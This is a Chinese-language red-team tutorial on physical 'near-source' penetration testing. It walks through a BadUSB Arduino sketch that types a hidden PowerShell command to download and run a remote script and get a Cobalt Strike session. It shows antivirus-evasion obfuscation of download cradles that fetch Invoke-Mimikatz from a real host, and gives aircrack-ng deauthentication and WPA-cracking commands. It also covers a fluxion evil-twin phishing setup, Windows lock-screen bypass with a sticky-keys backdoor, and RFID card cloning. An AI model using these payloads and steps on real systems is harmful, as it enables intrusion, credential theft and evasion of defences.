# 一、近源渗透

近源渗透测试是网络空间安全领域逐渐兴起的一种新的安全评估手段。

它是一种集常规网络攻防、物理接近、社会工程学及无线电通信攻防等能力于一体的高规格网络安全评估行动。网络安全评估小组在签订渗透测试授权协议后，通过乔装、社工等方式实地物理侵入企业办公区域，通过其内部各种潜在攻击面（如Wi-Fi网络、RFID门禁、暴露的有线网口、USB接口等）获得“战果”，最后以隐秘的方式将评估结果带出上报，由此证明企业安全防护存在漏洞。

## 1.1 常见方式

 **1.无线网卡**

外接无线网卡主要是用来配合kali破解无线密码的，现在一般是通过抓握手包然后跑包来破解。还有其他的方式可以通过伪造SSID钓鱼等等。

 **2.WIFI 大菠萝**

大菠萝不是吃的那个玩意，可以说是一个钓鱼WiFi。最新版本的大菠萝功能更强大，其实可以替代上面的外接无线网卡了。大菠萝可以捕获握手包并模仿目标AP，甚至可以完全模仿首选网络，从而实现中间人攻击。

 **3.EMP干扰器**

当前电子设备和电路的工作频率不断提高，而工作电压却逐渐降低，因此对电磁脉冲（EMP）的敏感性和易损性也不断增加。同时，电子系统中的集成电路对电磁脉冲比较敏感，往往一个较大的电磁脉冲，就会使集成块产生误码、甚至电子元器件失效或烧毁，所以我们可以使用EMP干扰来打开部分电子门禁和电子密码锁。甚至你可以用一个电蚊拍自制EMP请自行搜索教程。

 **4.变色龙**

变色龙主要有三种使用方法，第一种是随机化UID进行模糊测试、第二种是支持IC卡的仿真、第三种是存储多张虚拟化卡。有机会具体介绍

 **5.纳米指纹膜**

这个公司门禁代打卡的小伙伴们应该不陌生，曾经有同事就这么玩过。就是可以通过指纹拓印出一个跟原指纹一模一样的指纹膜。至于怎样能获得对方的指纹....就得看你的社工啦。

 **6.键盘记录器**

如果你能接触到目标主机，那你就可以将键盘记录器接入到主机和键盘之间，并配置连接WI-FI，将键盘敲击的数据实时传回远程服务器。

 **7.内网硬件植入**

通过前面的步骤，红队渗透小哥哥可能已经进入了蓝队内部，这个时候我们就需要可以在内网偷偷装一个PacketSquirrel，作为中间人攻击工具，PacketSquirrel可以捕获网络端点的数据包、并且可以使用VPN和反向shell获得远程访问权限。

 **8.HID 攻击**

badusb是HID（人机接口）攻击的一种，也称为热插拔攻击。想象一下，你可以走到一台计算机上，插入看似无害的USB驱动器，然后安装后门，窃听文档，窃取密码...（用法很多，全靠想象）。

# 二、Badusb 上线CS

​
BadUSB是利用了USB协议上的漏洞，通过更改USB的内部固件，在正常的USB接口接入后，模拟外置鼠标、键盘的功能，以此来使目标主机执行已经精心构造好的命令。在此过程中不会引起杀毒软件、防火墙的一丝怀疑。而且因为是在固件级别的应用，U盘格式化根本无法阻止其内部代码的执行。

​
同样因为是对USB的利用，Windows、Linux、MAC等各类操作系统不必联网下载专用的驱动程序。此外，向BadUSB烧录的程序极为简单，大部分是对键盘按键进行模拟，上手较为容易。

​
BadUSB也是社会工程学的一个典型示例，它极大地利用了人们的好奇心，在路边捡到的USB，估计九成以上的人们都想看看里面有什么东西，而当你插入U盘，攻击就很难再停止下来了。

## 2.1 准备工作

  * 一个Arduino Leonardo开发板，伪装成虚拟键盘的U盘

  * Arduino IDE，用来烧录代码

  * 部署好CS服务端，用来上线

## 2.2 CS简单免杀

部署CobaltStrike服务器，生成powershell的payload

![image-20230420175904727](https://image.3001.net/images/20230507/1683451472_64576e5019b7c95ca29a2.png!small)

### 2.2.1 代码混淆

PowerShell的免杀可以用[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)，Invoke-Obfuscation主要是对ps1脚本进行免杀，需要现有一个ps的payload。

进入Invoke-Obfuscation目录后，在PowerShell中执行命令

    
    
    Import-Module .\Invoke-Obfuscation.psd1
    Invoke-Obfuscation
    #然后执行命令，指定待处理的Ps1文件
    set scriptpath c:\xxx\payload.ps1
    encoding
    #输入encoding 并选择编码方式，比如
    1
    #输入命令，导出免杀ps文件到指定路径
    out C:\xxx\xxx.ps1
    

### 2.2.2 远程代码执行-替换和干扰

虽然ps1代码自身免杀，但在⽤powershell执⾏远程下载或执⾏shellcode时，很容易触发杀软⾏为规则。对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做⼀些处理。

1、替换文件名

    
    
    copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.txt
    
    bypass.txt "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://www.xiaodi8.com/ms/ps/1.ps1''));Invoke-Mimikatz';IEX ($a+$b)"
    

2、替换关键字

    
    
    powershell "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://www.xiaodi8.com/ms/ps/1.ps1''));Invoke-Mimikatz';IEX ($a+$b)"
    
    powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://www.xiaodi8.com/ms/ps/payload.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
    

替换常见关键字

    
    
    IEX $DoIt -- i`ex $DoIt
    IEX $a  --  ie`x $a
    $var_runme -- $vrunme
    $var_buffer -- $vbuffer
    func_get_proc_address --  func_k
    func_get_delegate_type -- func_l
    $var_type_builder -- $vk
    $var_parameters -- $vp
    $var_return_type-- $ve
    $var_procedure -- $v_pro
    

3、垃圾数据干扰

    
    
    powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString('ht'+'tp://www.xiaodi8.com/ms/ps/p1.ps1')
    

### 2.2.3 分离免杀

## 2.3 Arduino烧录代码

> 下载地址：https://github.com/arduino/arduino-ide/releases/tag/2.1.0

打开Arduino IDE

工具->板->选择"Arduino Leonardo"

![image-20230423225334134](https://image.3001.net/images/20230507/1683451473_64576e514e35e8a321636.png!small)

badusb可以模拟键盘输入和鼠标点击，具体按键设置:

    
    
    delay(5000);//延时毫秒
    Keyboard.begin();     //开始键盘通讯
    Keyboard.end();     //结束键盘通讯
    Keyboard.press();     //按下键盘按键    如果是非特殊按键如 数字、字母按键用单引号括起来
    Keyboard.release();     //释放键盘按键
    Keyboard.println("");     //输入字符串使用双引号括起来 
    Mouse.begin();//鼠标事件开始
    Mouse.click();//鼠标单击
    Mouse.end();//鼠标事件结束
    Mouse.move();//鼠标移动(x,y)
    Mouse.press();//鼠标按下
    Mouse.release();//鼠标松开
    Mouse.isPressed();//   
    KEY_LEFT_CTRL
    KEY_LEFT_SHIFT
    KEY_LEFT_ALT
    KEY_LEFT_GUI    //win键
    KEY_RIGHT_CTRL
    KEY_RIGHT_SHIFT
    KEY_RIGHT_ALT
    KEY_RIGHT_GUI
    KEY_UP_ARROW
    KEY_DOWN_ARROW
    KEY_LEFT_ARROW
    KEY_RIGHT_ARROW
    KEY_BACKSPACE
    KEY_TAB
    KEY_RETURN//回车键
    KEY_ESC
    KEY_INSERT
    KEY_DELETE
    KEY_PAGE_UP
    KEY_PAGE_DOWN
    KEY_HOME
    KEY_END
    KEY_CAPS_LOCK
    KEY_F1
    KEY_F2
    KEY_F3
    KEY_F4
    KEY_F5
    KEY_F6
    KEY_F7
    KEY_F8
    KEY_F9
    KEY_F10
    KEY_F11
    KEY_F12
    

参考攻击代码

    
    
    #include <Keyboard.h>
    void setup() {
      // putpower shell your setup code here, to run once
      Keyboard.begin();//开始键盘通讯 
    delay(3000);//延时 
    Keyboard.press(KEY_LEFT_GUI);//win键 
    delay(500);
    Keyboard.press('r');//r键
    delay(500); 
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r'); 
    delay(500);
    Keyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=15 lines=1");  //无回显
    //Keyboard.println("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1\"");   //有回显
    delay(500);
    Keyboard.press(KEY_RETURN); 
    Keyboard.release(KEY_RETURN); 
    Keyboard.println("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass Iex(New-Object Net.WebClient).DownloadString('http://x.x.x.x/xxx.ps1')"); 
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.end();//结束键盘通讯 
    }
     
    void loop() {
      // put your main code here, to run repeatedly:
     
    }
    

> 在代码实现的过程中主要发现2个坑点。  
> 1、目标机器默认中文输入法的问题  
> 2、在某些系统运行需要安装驱动
>
> 尝试了2种解决方法：  
> 1、模拟KEY_LEFT_SHIFT按键把中文输出法切换为英文  
> 2、模拟KEY_CAPS_LOCK按键输出大写字符  
> 第一种解决方法，模拟KEY_LEFT_SHIFT按键，在目标为中文输入法时，可以正常切换为英文，正常输出，但一旦对方默认为英文输入法，反而画蛇添足。  
> 第二种解决方法，模拟KEY_CAPS_LOCK按键，在默认使用中英文输入法时都适用，唯一不适应的情况是对方默认使用中文输入法且开启了大写输入。

进行烧录程序

注意右下角，程序写到BadUSB里，别写错地方了，程序不报错证明成功

![image-20230420174053937](https://image.3001.net/images/20230507/1683451474_64576e527b5a41560765a.png!small)

# 三、Wife渗透

## 3.1 Wife密码爆破

Aircrack-ng是一款基于破解无线802.11协议的WEP及WPA-PSK加密的工具。该工具主要用了两种攻击方式进行WEP破解。一种是FMS攻击，该攻击方式是以发现该WEP漏洞的研究人员名字（Scott
Fluhrer、Itsik Mantin及Adi
Shamir）所命名；另一种是Korek攻击，该攻击方式是通过统计进行攻击的，并且该攻击的效率要远高于FMS攻击。

### 3.1.1 破解WEP加密的无线网络

Wired Equivalent
Privacy或WEP（有线等效加密）协议是对在两台设备间无线传输的数据进行加密的方式，用以防止非法用户窃听或侵入无线网络。不过密码分析学家已经找出WEP好几个弱点，因此在2003年被Wi-Fi Protected Access（WPA）淘汰，又在2004年由完整的IEEE 802.11i标准（又称为WPA2）所取代。

现在使用该协议的较少，可参考[文章](http://shouce.jb51.net/kali-linux-tutorial/52.html)

### 3.1.2 破解WPA/WPA2无线网络

WPA全名为Wi-Fi Protected
Access，有WPA和WPA2两个标准。它是一种保护无线电脑网络安全的协议。对于启用WPA/WPA2加密的无线网络，其攻击和破解步骤及攻击是完全一样的。不同的是，在使用airodump-ng进行无线探测的界面上，会提示为WPA CCMP PSK。当使用aireplay-ng进行攻击后，同样获取到WPA握手数据包及提示；在破解时需要提供一个密码字典。下面将介绍破解WPA/WPA2无线网络的方法。

使用aircrack-ng破解WPA/WPA2无线网络的具体操作步骤如下所示。

    
    
    #查看无线网络接口
    airmon-ng
    #停止无线网络接口
    airmon-ng stop wlan0
    #修改无线网卡MAC地址
    macchanger --mac 00:11:22:33:44:55 wlan0
    #启用无线网络接口
    airmon-ng start wlan0
    #捕获数据包
    airodump-ng -c 1 -w abc --bssid  F6:4C:A1:B5:C6:81  mon0
    #对无线路由器Test进行Deauth攻击
    aireplay-ng --deauth 1 -a 14:E6:E4:AC:FB:20 -c 00:11:22:33: 44:55 mon0
    #破解密码
    aircrack-ng -w 1.txt test-01.cap
    

### 3.1.3 攻击WPS无线

WPS是由Wi-Fi联盟所推出的全新Wi-Fi安全防护设定标准。该标准主要是为了解决无线网络加密认证设定的步骤过于繁杂的弊病。因为通常用户往往会因为设置步骤太麻烦，以至于不做任何加密安全设定，从而引起许多安全上的问题。所以很多人使用WPS设置无线设备，可以通过个人识别码（PIN）或按钮（PBC）取代输入一个很长的密码短语。当开启该功能后，攻击者就可以使用暴力攻击的方法来攻击WPS。本小节将介绍使用各种工具攻击WPS。

现在大部分路由器上都支持WPS功能。以前路由器有专门的WPS设置，现在的路由器使用QSS功能取代了。以TP-LINK型号为例，介绍设置WPS功能，只需要按下路由器上的QSS/RESET按钮就可以了。

[利用在线密码](https://www.bugku.com/mima/)生成1.txt字典，使用kail中自带的Aircrack-ng，首先查看无线网卡的信息

    
    
    #查看wlan0和eth0的信息
    iwconfig
    #kill掉可能影响的进程
    airmon-ng check kill
    #启用无线网卡的监听模式,启用成功后，Ifconfig可以看到无线网卡的信息。
    airmon-ng start wlan0
    #监听附近的所有wifi通信
    airodump-ng wlan0mon
    #通过后台持续运行,抓取指定ap的无线通信,这里-c指定对应通道
    airodump-ng --bssid F6:4C:A1:B5:C6:81 -c 10 -w test wlan0mon
    aireplay-ng -0 2 -a F6:4C:A1:B5:C6:81 -c 20:64:CB:0E:E3:ED wlan0mon
    #查看后台运行的监听进程，抓到数据包为成功
    airodump-ng --bssid F6:4C:A1:B5:C6:81 -c 11 -w test wlan0mon
    #通过碰撞破解握手包的密码，获取wifi密码
    aircrack-ng -w 1.txt test-01.cap
    

使用wifite更加简单

    
    
    #启动Wifite工具，并指定使用common.txt密码字典
    wifite -dict common.txt
    

停止扫描无线网络，将显示如下所示的信息

![image-20230421145820368](https://image.3001.net/images/20230507/1683451475_64576e53acc6bc9bb8371.png!small)

从以上输出信息中，可以看到扫描到五个无线接入点和三个客户端。在输出信息中，共显示了7列。分别表示无线接入点编号、ESSID号、信道、加密方式、电功率、是否开启wps和客户端。如果仅有一个客户端连接到无线接入点，则CLIENT列显示是client。如果有多个客户端连接的话，则显示是clients。

此时，选择要攻击的无线接入点。这里选择第五个无线接入点，输入“1”。然后按下回车键将开始攻击

攻击成功，如果密码在密码本中，即可列出明文密码。

## 3.2 Wife钓鱼

使用fluxion工具，首先iwconfig查看无线网卡的信息，然后fluxion -i安装依赖

1、首先获取目标握手包

    
    
    [2] Handshake Snooper 检索WPA/WPA2加密散列。
    [3] 扫描所有信道  (2.4GHz & 5Ghz)
    [2] 跳过
    [2] aireplay-ng 解除认证方式 (侵略性)
    [2] cowpatty 验证 (推荐用这个)
    [1] 每30秒钟 (推荐).
    [2] Synchronously (推荐).
    

2、之后泛洪攻击目标ap，使其停止无线服务

    
    
    [1] 选择启动攻击方式
    [1] 专属门户 创建一个“邪恶的双胞胎”接入点
    [2] 跳过
    [2] wlan0    [*] Ralink Technology, Corp. RT2870/RT3070      
    [2] aireplay
    [1] 流氓 AP - hostapd (推荐)
    [1] hash - cowpatty
    [1] 使用抓取到的hash文件
    [2] cowpatty 验证 (推荐用这个)
    

3、通过钓鱼框架，伪造目标网络信息，诱导用户连接

    
    
    [1] 创建SSL证书
    [2] 仿真
    [03] 通用认证网页                              Chinese 
    

用户连接钓鱼wifi后，将捕获的用户输入的握手包，与之前认证的握手包进行校验；如果校验成功，则停止攻击目标ap ，否则继续攻击，直至成功破解

## 3.3 无线路由器漏洞利用

[RouterSploit](https://github.com/threat9/routersploit)它包含了27+个品牌的上百种漏洞利用模块，涉及的路由器、摄像头等设备有几百种。可自动设别设备型号自动扫描可利用的漏洞。

# 四、绕过windows锁屏

近源渗透中经常遇到电脑存在登录密码的情况。某些安全措施严格的目标，还会启用Bitlocker磁盘加密。

## 4.1 Kon-Boot

Kon-Boot是最著名的密码绕过工具。其原理可谓神奇：在系统引导阶段，通过修改Windows内核，使验证用户凭证的代码失效。它不会删除密码，而是使登录时的密码验证失效，输入任意密码即可登录。

![image-20230421151245480](https://image.3001.net/images/20230507/1683451476_64576e54acd07d768d0e9.png!small)

完整版本的Kon-Boot是付费软件，个人许可证价格为$50，商业许可证价格为$140。

如果不打算购买许可证，也可以使用免费版本。本文使用最后一个免费版本V2.5。该版本可以绕过除Windows 10的在线账户之外的密码。在绕过失败时，Kon-Boot可以添加账号，或安装Shift键后门。

Kon-Boot可以满足大多数渗透场景的需求，但它有着几个缺点：

  * 是付费软件，全功能版价格为140美元

  * 无法绕过Bitlocker磁盘加密

  * Kon-Boot绕过密码的成功率差强人意，经常需要重试

## 4.2 GrabAccess

> 官网地址：https://kon-boot.com/index.html

和Kon-Boot类似，GrabAccess也是密码绕过工具。对比起Kon-Boot，GrabAccess的优点有：

  * 免费，并基于GPL协议开源

  * 可以绕过Bitlocker植入后门

  * 只要引导环境符合要求，成功率接近百分百

  * 自动化植入木马。只需要一步操作，耗时短，适合近源渗透场景

其最主要的优势是成功率高。在实战中发现Kon-boot绕过成功率非常之不稳定，尤其是针对Windows 10。

但在目前，GrabAccess仅支持UEFI引导的64位系统。针对Windows xp，或MBR引导的Windows 7，仍推荐Kon-Boot。

 **使用方式**

GrabAccess最基础的功能是安装Shift键后门，将Windows粘滞键替换为任务管理器。在不登陆的情况下，也可以执行系统命令或读写文件。

> 下载地址：https://github.com/Push3AX/GrabAccess

  * 准备一个U盘。如果是FAT、FAT16或FAT32格式，则可以不删除已有的文件。否则需要格式化为上述格式。

  * 下载GrabAccess，解压，将EFI文件夹拷贝到U盘根目录。

至此GrabAccess的最简安装完成。

  * 将U盘插入电脑，重启电脑。在启动时进入BIOS菜单。

  * 选择从U盘启动，或设置U盘为第一启动项。如图所示，最后一个启动项是U盘，选择其启动即可。

（如果BIOS开启了Security Boot，还需将其设置为DISABLE）

![image-20230421151846274](https://image.3001.net/images/20230507/1683451477_64576e55b80b43ef8ef3b.png!small)

  * 在登录界面，连续按下五次Shift键，即可唤出任务管理器。

  * 点击文件-运行新任务-浏览，将右下角的“文件类型”选择为所有文件，即可查看、读写电脑上的所有文件。

  * 点击文件可以运行cmd，执行任意代码。例如删除当前账号的密码、添加新账号等。

# 五、门禁锁

门紧锁一般可以分为无线电锁、RFID锁等

其中无线电锁的无线遥控模块常见于门禁、停车场栏杆等  
一般使用特定频段315Mhz、443Mhz频段

 **攻击方式：**

  * 使用固定码，则可被重放攻击

  * 部分滚动码的生成算法已被分析，可能造成滚动码失效

  * 在不知道密码的情况下可进行爆破

![image-20230507170541473](https://image.3001.net/images/20230507/1683451478_64576e569bf8c8b5a5d9e.png!small)

 **RFID锁具**

ID卡与lC卡：

  * ID卡较为古老，但廉价，ID卡只有一个ND号，无法存储数据

  * IC卡内部有存储器，并且可以加密数据，IC卡以NXP公司的Mifare为主

  * Mifare卡的存储空间分为1K版和4K版，CPU卡在正常设计的情况下极难破解

![image-20230507170739944](https://image.3001.net/images/20230507/1683451479_64576e577707671435261.png!small)

该类卡可以读取芯片中的数据，获取密钥信息，进行伪造，网站有门禁复制器等工具直接复制，例如

![image-20230507171143348](https://image.3001.net/images/20230507/1683451480_64576e58e09d478ad245d.png!small)

